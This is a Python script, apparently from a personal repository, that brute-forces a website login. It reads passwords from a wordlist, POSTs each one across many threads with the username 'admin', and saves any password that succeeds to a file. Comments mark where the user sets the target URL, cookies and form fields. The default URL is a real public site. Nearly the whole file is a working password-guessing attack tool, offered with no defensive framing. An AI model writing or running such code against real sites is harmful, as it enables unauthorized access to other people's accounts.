# auth : geoganlle
# email: geoganlle@163.com
# date : 20210228
#
# 多线程尝试密码
# Guess website password with multithreading method
#
# reference resources:
#  1. https://www.runoob.com/python3/python3-multithreading.html
#  2. https://www.jianshu.com/p/3efd3197ab35?utm_campaign=maleskine&utm_content=note&utm_medium=seo_notes&utm_source=recommendation

import requests
import urllib
import queue
import threading
import time
import numpy as np
import random
import math

thefile = open("pw.text",'rb')
pwsum = 0
while True: 
  buffer = thefile.read(1024 * 8192)
  if not buffer:
    break
  pwsum += buffer.decode().count('\n')
thefile.close()

url = "https://www.baidu.com/"                                           #notice 1: fix your need url

headers = {
  'Content-Type': 'application/x-www-form-urlencoded',
  'Cookie': 'xxxxxxxxxxxxx'                                              #notice 2: add Cookies if website need
}

f=open("pw.text",'r')
pwlines = f.readlines()

exitFlag = False    #是否退出
threadworknum = 129 #每个线程处理threadworknum-1条数据                     # notice 3: fix if you need

partnum = 5         #程序分(partnum-1)个阶段                              # notice 4: fix if you need
partsize = 257      #每阶段包含partsize-1条数据                            # notice 5: fix if you need


curcount = 0

def printprocess(threadName):
    global curcount
    progresslen = 150                       #进度条长度                    # notice 6: fix depend on the length of console
    progress = round(curcount%(partsize-1)/(partsize-1)*100)     #进度 n%
    if progress == 0 :
        if curcount > 0:
            progresscount1 = 100                                 #█数量
        else:
            progresscount1 = 0
    else:
        progresscount1 = round(progress*(progresslen/100))       #█数量
    progresscount2 = progresslen-round(progresscount1)           #_数量
    print('\r已执行 {0:7}/{1}/{2}条 '.format(curcount,(partsize-1),pwsum), end='')
    print('当前进度：{0}% [{1}{2}]'.format(progress,'█'*progresscount1,'_'*progresscount2), end='')

def successprintprocess(pwd,response):
    print('\r\n执行完毕！')
    print('\r\n密码:('+pwd+')正确！')
    print('\r\n返回码：' + response.text)
    fd = open('password.txt', 'w+')
    fd.write("\n\tpassword:\t"+pwd)
    fd.write("\n\retrun:\t"+response.text)
    fd.close()

class myThread (threading.Thread):

    def __init__(self, threadID, name, q):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.q = q

    def run(self):
        print ("开启线程：" + self.name)
        process_data(self.name, self.q)
        #print ("退出线程：" + self.name)

def process_data(threadName, q):
    global exitFlag
    while not exitFlag:
        queueLock.acquire()
        if workQueue.empty():
            queueLock.release()
            break
        else:
            data = q.get()
            queueLock.release()

            time.sleep(1)
            for num in range(1,threadworknum):
                cur = (data-1)*(threadworknum-1) + num #当前处理的是第几个
                pwd = pwlines[cur]
                pwd = pwd[0:6] #去除\n

                if not pwd:
                    print('\r\n字典已比对完。')
                    exitFlag = True
                    break

                payload='a1j2a3x4o5p6t7y8p9e10=login&userid=admin&password='+pwd   # notice 7: http context
                response = requests.request("POST", url, headers=headers, data=payload)

                global curcount
                curcount = curcount + 1

                #if ((not exitFlag) and (random.randint(0,1)==1)) or curcount==(partsize-1):
                if curcount%17 == 0 or curcount==(partsize-1):
                    printprocess(threadName)

                if response.text != '2':
                    successprintprocess(pwd,response)
                    exitFlag = True
                    workQueue.queue.clear()
                    break
            

for num in range(1,partnum):
    exitFlag = False
    
    start = time.time()
    threadList =  np.arange( 1, math.ceil(partsize/(threadworknum-1)), 1 )  #64线程
    nameList =  np.arange( 1, math.ceil(partsize/(threadworknum-1)), 1 )    #pattsize
    queueLock = threading.Lock()
    workQueue = queue.Queue()
    threads = []
    threadID = 1

    # 填充队列
    queueLock.acquire()
    for word in nameList:
        workQueue.put(word)
    queueLock.release()

    # 创建新线程
    for tindex in threadList:
        thread = myThread(threadID, "Thread-"+str(tindex), workQueue)
        thread.start()
        threads.append(thread)
        threadID += 1

    # 等待队列清空
    while not workQueue.empty():
        pass

    # 通知线程是时候退出
    exitFlag = True

    # 等待所有线程完成
    for t in threads:
        t.join()
    print ("\r\n退出主线程!")
    f.close()

    fr=open("pw.text",'r')
    afiletext = fr.readlines()
    fr.close()
    fw = open('pw.text','w+')
    del afiletext[0:(partsize-1)]
    fw.writelines(afiletext)
    fw.close()
    print ("\r\n无效密码删除完毕!")
